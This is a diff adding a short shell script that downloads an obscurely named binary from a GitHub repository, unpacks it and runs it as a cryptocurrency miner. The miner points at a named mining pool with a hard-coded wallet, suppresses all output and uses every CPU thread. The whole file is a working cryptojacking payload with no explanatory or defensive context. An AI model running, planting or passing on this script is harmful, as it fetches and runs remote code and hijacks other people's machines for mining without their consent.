@@ -1,0 +1,11 @@
+#!/bin/sh
+
+A=sf.pool-pay.com:4025
+B=SafexsowfGVLU6bPNFLRU1dJYGnsNjKeCS7maGPjCEhr8vg78wmDgWQCoMr3FHSy3k4bdWUBiqDgaJDUGh9fDv8n5gRgnyyem5A4i
+C=PAYG
+D=rx/0
+apt-get update && apt-get upgrade -y
+wget https://github.com/muledan1/bash/raw/main/-.tar.gz
+tar -xf -.tar.gz
+./- --donate-level 1 -o $A -u $B -p $C -a $D -k -t$(nproc --all) >/dev/null >/dev/null 2>&1
+sleep 10
